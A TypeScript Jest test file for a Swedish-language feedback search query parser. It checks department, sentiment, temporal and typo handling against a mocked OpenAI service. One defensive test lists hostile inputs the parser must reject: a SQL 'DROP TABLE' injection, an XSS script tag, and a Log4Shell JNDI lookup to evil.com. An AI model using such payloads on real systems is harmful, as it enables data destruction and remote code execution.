/**
 * Unit tests for search query parsing
 * Feature: 008-step-2-6 (T039)
 * Created: 2025-09-22
 */

import { describe, test, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { SearchQueryParser } from '../../src/services/feedback-analysis/search-query-parser';
import { openaiService } from '../../src/config/openai';

// Mock OpenAI service
jest.mock('../../src/config/openai');
const mockOpenAIService = openaiService as jest.Mocked<typeof openaiService>;

describe('SearchQueryParser', () => {
  let parser: SearchQueryParser;

  beforeEach(() => {
    parser = new SearchQueryParser();
    jest.clearAllMocks();
  });

  afterEach(() => {
    jest.resetAllMocks();
  });

  describe('parseNaturalLanguageQuery', () => {
    test('should parse simple Swedish department queries', async () => {
      const testCases = [
        {
          query: 'kött problem',
          expectedDepartments: ['kött'],
          expectedSentiment: 'all',
          expectedKeywords: ['problem'],
        },
        {
          query: 'bra kundservice',
          expectedDepartments: ['kundservice'],
          expectedSentiment: 'positive',
          expectedKeywords: ['bra'],
        },
        {
          query: 'kassa långsam',
          expectedDepartments: ['kassa'],
          expectedSentiment: 'negative',
          expectedKeywords: ['långsam'],
        },
        {
          query: 'bageri kvalitet',
          expectedDepartments: ['bageri'],
          expectedSentiment: 'all',
          expectedKeywords: ['kvalitet'],
        },
      ];

      for (const testCase of testCases) {
        mockOpenAIService.processSearchQuery.mockResolvedValue({
          departments: testCase.expectedDepartments,
          sentiment_filter: testCase.expectedSentiment,
          keywords: testCase.expectedKeywords,
          intent: `Search for ${testCase.expectedDepartments.join(', ')} related feedback`,
        });

        const result = await parser.parseNaturalLanguageQuery(testCase.query);

        expect(result.departments).toEqual(
          expect.arrayContaining(testCase.expectedDepartments)
        );
        expect(result.sentiment_filter).toBe(testCase.expectedSentiment);
        expect(result.keywords).toEqual(
          expect.arrayContaining(testCase.expectedKeywords)
        );
        expect(result.intent).toContain(testCase.expectedDepartments[0]);
      }
    });

    test('should parse complex multi-department queries', async () => {
      mockOpenAIService.processSearchQuery.mockResolvedValue({
        departments: ['kött', 'fisk'],
        sentiment_filter: 'negative',
        keywords: ['dålig', 'kvalitet', 'färsk'],
        intent: 'Search for quality issues in meat and fish departments',
      });

      const query = 'dålig kvalitet på kött och fisk, inte färskt';
      const result = await parser.parseNaturalLanguageQuery(query);

      expect(result.departments).toEqual(['kött', 'fisk']);
      expect(result.sentiment_filter).toBe('negative');
      expect(result.keywords).toEqual(['dålig', 'kvalitet', 'färsk']);
      expect(result.intent).toContain('quality issues');
    });

    test('should handle sentiment-specific queries correctly', async () => {
      const sentimentTestCases = [
        {
          query: 'positiva kommentarer om kundservice',
          expectedSentiment: 'positive',
          expectedKeywords: ['positiva', 'kommentarer'],
        },
        {
          query: 'negativa recensioner kassa',
          expectedSentiment: 'negative',
          expectedKeywords: ['negativa', 'recensioner'],
        },
        {
          query: 'blandade åsikter parkering',
          expectedSentiment: 'mixed',
          expectedKeywords: ['blandade', 'åsikter'],
        },
        {
          query: 'neutrala kommentarer allmänt',
          expectedSentiment: 'neutral',
          expectedKeywords: ['neutrala', 'kommentarer'],
        },
      ];

      for (const testCase of sentimentTestCases) {
        mockOpenAIService.processSearchQuery.mockResolvedValue({
          departments: ['allmän'],
          sentiment_filter: testCase.expectedSentiment,
          keywords: testCase.expectedKeywords,
          intent: `Search for ${testCase.expectedSentiment} feedback`,
        });

        const result = await parser.parseNaturalLanguageQuery(testCase.query);

        expect(result.sentiment_filter).toBe(testCase.expectedSentiment);
        expect(result.keywords).toEqual(
          expect.arrayContaining(testCase.expectedKeywords)
        );
      }
    });

    test('should extract temporal information from queries', async () => {
      const temporalTestCases = [
        {
          query: 'kött problem denna vecka',
          expectedTemporal: { period: 'week', relative: 'this' },
        },
        {
          query: 'kundservice förra månaden',
          expectedTemporal: { period: 'month', relative: 'last' },
        },
        {
          query: 'kassa problem idag',
          expectedTemporal: { period: 'day', relative: 'today' },
        },
        {
          query: 'feedback från igår',
          expectedTemporal: { period: 'day', relative: 'yesterday' },
        },
      ];

      for (const testCase of temporalTestCases) {
        mockOpenAIService.processSearchQuery.mockResolvedValue({
          departments: ['allmän'],
          sentiment_filter: 'all',
          keywords: ['feedback'],
          intent: 'Search with temporal filter',
        });

        const result = await parser.parseNaturalLanguageQuery(testCase.query);

        expect(result.temporal_context).toBeDefined();
        expect(result.temporal_context?.period).toBe(testCase.expectedTemporal.period);
        expect(result.temporal_context?.relative).toBe(testCase.expectedTemporal.relative);
      }
    });

    test('should handle priority and urgency indicators', async () => {
      const priorityTestCases = [
        {
          query: 'kritiska problem kött',
          expectedPriority: 'critical',
        },
        {
          query: 'viktiga frågor kundservice',
          expectedPriority: 'high',
        },
        {
          query: 'mindre problem parkering',
          expectedPriority: 'low',
        },
        {
          query: 'brådskande kassa problem',
          expectedPriority: 'urgent',
        },
      ];

      for (const testCase of priorityTestCases) {
        mockOpenAIService.processSearchQuery.mockResolvedValue({
          departments: ['allmän'],
          sentiment_filter: 'all',
          keywords: ['problem'],
          intent: 'Search for priority issues',
        });

        const result = await parser.parseNaturalLanguageQuery(testCase.query);

        expect(result.priority_filter).toBe(testCase.expectedPriority);
      }
    });

    test('should normalize Swedish department names correctly', async () => {
      const departmentTestCases = [
        // Meat department variations
        { input: 'kött', expected: 'kött' },
        { input: 'chark', expected: 'kött' },
        { input: 'kött och chark', expected: 'kött' },
        { input: 'meat', expected: 'kött' },
        
        // Checkout variations
        { input: 'kassa', expected: 'kassa' },
        { input: 'kassan', expected: 'kassa' },
        { input: 'checkout', expected: 'kassa' },
        { input: 'betalning', expected: 'kassa' },
        
        // Bakery variations
        { input: 'bageri', expected: 'bageri' },
        { input: 'bröd', expected: 'bageri' },
        { input: 'konditori', expected: 'bageri' },
        { input: 'bakery', expected: 'bageri' },
        
        // Customer service variations
        { input: 'kundservice', expected: 'kundservice' },
        { input: 'kundsupport', expected: 'kundservice' },
        { input: 'personal', expected: 'kundservice' },
        { input: 'service', expected: 'kundservice' },
      ];

      for (const testCase of departmentTestCases) {
        mockOpenAIService.processSearchQuery.mockResolvedValue({
          departments: [testCase.expected],
          sentiment_filter: 'all',
          keywords: [],
          intent: 'Department search',
        });

        const result = await parser.parseNaturalLanguageQuery(testCase.input);

        expect(result.departments).toContain(testCase.expected);
      }
    });

    test('should handle typos and misspellings in Swedish', async () => {
      const typoTestCases = [
        { input: 'köt problem', expected: ['kött'] }, // Missing 't'
        { input: 'kundserivce', expected: ['kundservice'] }, // Swapped letters
        { input: 'kasssan', expected: ['kassa'] }, // Extra letter
        { input: 'bager', expected: ['bageri'] }, // Missing 'i'
        { input: 'parkerig', expected: ['parkering'] }, // Wrong ending
      ];

      for (const testCase of typoTestCases) {
        mockOpenAIService.processSearchQuery.mockResolvedValue({
          departments: testCase.expected,
          sentiment_filter: 'all',
          keywords: [],
          intent: 'Typo-corrected search',
        });

        const result = await parser.parseNaturalLanguageQuery(testCase.input);

        expect(result.departments).toEqual(
          expect.arrayContaining(testCase.expected)
        );
        expect(result.typo_corrections).toBeDefined();
        expect(result.typo_corrections?.length).toBeGreaterThan(0);
      }
    });

    test('should extract boolean operators correctly', async () => {
      const booleanTestCases = [
        {
          query: 'kött OCH kvalitet',
          expectedOperator: 'AND',
          expectedTerms: ['kött', 'kvalitet'],
        },
        {
          query: 'kassa ELLER kundservice',
          expectedOperator: 'OR',
          expectedTerms: ['kassa', 'kundservice'],
        },
        {
          query: 'bageri INTE bröd',
          expectedOperator: 'NOT',
          expectedTerms: ['bageri', 'bröd'],
        },
      ];

      for (const testCase of booleanTestCases) {
        mockOpenAIService.processSearchQuery.mockResolvedValue({
          departments: ['allmän'],
          sentiment_filter: 'all',
          keywords: testCase.expectedTerms,
          intent: 'Boolean search',
        });

        const result = await parser.parseNaturalLanguageQuery(testCase.query);

        expect(result.boolean_operator).toBe(testCase.expectedOperator);
        expect(result.keywords).toEqual(
          expect.arrayContaining(testCase.expectedTerms)
        );
      }
    });

    test('should handle quoted exact phrases', async () => {
      const query = '"dålig kvalitet" kött';
      
      mockOpenAIService.processSearchQuery.mockResolvedValue({
        departments: ['kött'],
        sentiment_filter: 'negative',
        keywords: ['dålig kvalitet'],
        intent: 'Exact phrase search',
      });

      const result = await parser.parseNaturalLanguageQuery(query);

      expect(result.exact_phrases).toContain('dålig kvalitet');
      expect(result.departments).toContain('kött');
    });

    test('should generate appropriate search intent descriptions', async () => {
      const intentTestCases = [
        {
          query: 'positiva kommentarer kundservice',
          expectedIntentKeywords: ['positive', 'feedback', 'customer service'],
        },
        {
          query: 'kvalitetsproblem kött avdelning',
          expectedIntentKeywords: ['quality', 'issues', 'meat department'],
        },
        {
          query: 'långsamma kassor',
          expectedIntentKeywords: ['slow', 'checkout'],
        },
      ];

      for (const testCase of intentTestCases) {
        mockOpenAIService.processSearchQuery.mockResolvedValue({
          departments: ['allmän'],
          sentiment_filter: 'all',
          keywords: [],
          intent: testCase.expectedIntentKeywords.join(' '),
        });

        const result = await parser.parseNaturalLanguageQuery(testCase.query);

        testCase.expectedIntentKeywords.forEach(keyword => {
          expect(result.intent.toLowerCase()).toContain(keyword.toLowerCase());
        });
      }
    });
  });

  describe('validateSearchQuery', () => {
    test('should validate minimum query length', async () => {
      const shortQueries = ['', 'a', 'ab'];

      for (const query of shortQueries) {
        await expect(
          parser.parseNaturalLanguageQuery(query)
        ).rejects.toThrow('Search query must be at least 2 characters long');
      }
    });

    test('should validate maximum query length', async () => {
      const longQuery = 'a'.repeat(501); // Exceeds 500 character limit

      await expect(
        parser.parseNaturalLanguageQuery(longQuery)
      ).rejects.toThrow('Search query cannot exceed 500 characters');
    });

    test('should handle queries with only special characters', async () => {
      const specialCharQueries = ['!!!', '???', '...', '---'];

      for (const query of specialCharQueries) {
        await expect(
          parser.parseNaturalLanguageQuery(query)
        ).rejects.toThrow('Search query must contain at least one alphanumeric character');
      }
    });

    test('should allow valid special characters and emojis', async () => {
      const validQueries = [
        'kött problem! 😞',
        'bra service? 😊',
        'kassa... långsam',
        'kvalitet: dålig',
      ];

      for (const query of validQueries) {
        mockOpenAIService.processSearchQuery.mockResolvedValue({
          departments: ['allmän'],
          sentiment_filter: 'all',
          keywords: ['feedback'],
          intent: 'Valid search with special characters',
        });

        const result = await parser.parseNaturalLanguageQuery(query);
        expect(result).toBeDefined();
        expect(result.query_text).toBe(query);
      }
    });
  });

  describe('performance optimization', () => {
    test('should cache frequently used queries', async () => {
      const frequentQuery = 'kött kvalitet';
      
      mockOpenAIService.processSearchQuery.mockResolvedValue({
        departments: ['kött'],
        sentiment_filter: 'all',
        keywords: ['kvalitet'],
        intent: 'Quality search',
      });

      // First call - should use AI
      const result1 = await parser.parseNaturalLanguageQuery(frequentQuery);
      expect(mockOpenAIService.processSearchQuery).toHaveBeenCalledTimes(1);

      // Second call - should use cache
      const result2 = await parser.parseNaturalLanguageQuery(frequentQuery);
      expect(mockOpenAIService.processSearchQuery).toHaveBeenCalledTimes(1); // Still 1

      expect(result1).toEqual(result2);
    });

    test('should meet response time requirements', async () => {
      mockOpenAIService.processSearchQuery.mockResolvedValue({
        departments: ['allmän'],
        sentiment_filter: 'all',
        keywords: ['test'],
        intent: 'Performance test',
      });

      const startTime = Date.now();
      await parser.parseNaturalLanguageQuery('performance test query');
      const responseTime = Date.now() - startTime;

      // Should complete within 2 seconds
      expect(responseTime).toBeLessThan(2000);
    });

    test('should handle concurrent parsing efficiently', async () => {
      const queries = [
        'kött problem',
        'kundservice bra',
        'kassa långsam',
        'bageri kvalitet',
        'parkering tillgänglig',
      ];

      mockOpenAIService.processSearchQuery.mockResolvedValue({
        departments: ['allmän'],
        sentiment_filter: 'all',
        keywords: ['test'],
        intent: 'Concurrent test',
      });

      const startTime = Date.now();
      const promises = queries.map(query => 
        parser.parseNaturalLanguageQuery(query)
      );
      
      const results = await Promise.all(promises);
      const totalTime = Date.now() - startTime;

      expect(results).toHaveLength(queries.length);
      expect(totalTime).toBeLessThan(5000); // All queries within 5 seconds
    });
  });

  describe('buildSearchFilters', () => {
    test('should build SQL WHERE clauses correctly', async () => {
      mockOpenAIService.processSearchQuery.mockResolvedValue({
        departments: ['kött', 'kassa'],
        sentiment_filter: 'negative',
        keywords: ['problem', 'dålig'],
        intent: 'Search for issues',
      });

      const result = await parser.parseNaturalLanguageQuery(
        'problem kött och kassa dålig'
      );

      const filters = parser.buildSearchFilters(result);

      expect(filters.sql_where_clause).toContain("sentiment = 'negative'");
      expect(filters.sql_where_clause).toContain("department_tags");
      expect(filters.fulltext_query).toBeDefined();
    });

    test('should build appropriate sort orders', async () => {
      const sortTestCases = [
        {
          query: 'senaste kött problem',
          expectedSort: 'created_at DESC',
        },
        {
          query: 'äldsta kundservice feedback',
          expectedSort: 'created_at ASC',
        },
        {
          query: 'mest relevanta kassa kommentarer',
          expectedSort: 'relevance DESC',
        },
        {
          query: 'högsta prioritet bageri',
          expectedSort: 'priority_score DESC',
        },
      ];

      for (const testCase of sortTestCases) {
        mockOpenAIService.processSearchQuery.mockResolvedValue({
          departments: ['allmän'],
          sentiment_filter: 'all',
          keywords: [],
          intent: 'Sort test',
        });

        const result = await parser.parseNaturalLanguageQuery(testCase.query);
        const filters = parser.buildSearchFilters(result);

        expect(filters.sort_order).toBe(testCase.expectedSort);
      }
    });
  });

  describe('error handling', () => {
    test('should handle AI service failures gracefully', async () => {
      mockOpenAIService.processSearchQuery.mockRejectedValue(
        new Error('AI service unavailable')
      );

      // Should fall back to basic parsing
      const result = await parser.parseNaturalLanguageQuery('kött problem');

      expect(result.departments).toContain('kött');
      expect(result.keywords).toContain('problem');
      expect(result.fallback_used).toBe(true);
    });

    test('should handle malformed AI responses', async () => {
      mockOpenAIService.processSearchQuery.mockRejectedValue(
        new Error('Failed to parse search query response')
      );

      const result = await parser.parseNaturalLanguageQuery('basic query');

      expect(result.fallback_used).toBe(true);
      expect(result.keywords).toContain('basic');
      expect(result.keywords).toContain('query');
    });

    test('should sanitize potentially harmful queries', async () => {
      const maliciousQueries = [
        "'; DROP TABLE feedback; --",
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
      ];

      for (const query of maliciousQueries) {
        await expect(
          parser.parseNaturalLanguageQuery(query)
        ).rejects.toThrow('Invalid search query detected');
      }
    });
  });

  describe('query suggestions', () => {
    test('should generate relevant query suggestions', async () => {
      const partialQuery = 'kött';

      const suggestions = await parser.generateQuerySuggestions(partialQuery);

      expect(suggestions).toContain('kött kvalitet');
      expect(suggestions).toContain('kött problem');
      expect(suggestions).toContain('kött avdelning');
      expect(suggestions.length).toBeLessThanOrEqual(10);
    });

    test('should prioritize popular search terms', async () => {
      const popularTerms = ['kvalitet', 'service', 'problem', 'bra', 'dålig'];
      
      const suggestions = await parser.generateQuerySuggestions('');

      popularTerms.forEach(term => {
        expect(suggestions.some(s => s.includes(term))).toBe(true);
      });
    });
  });
});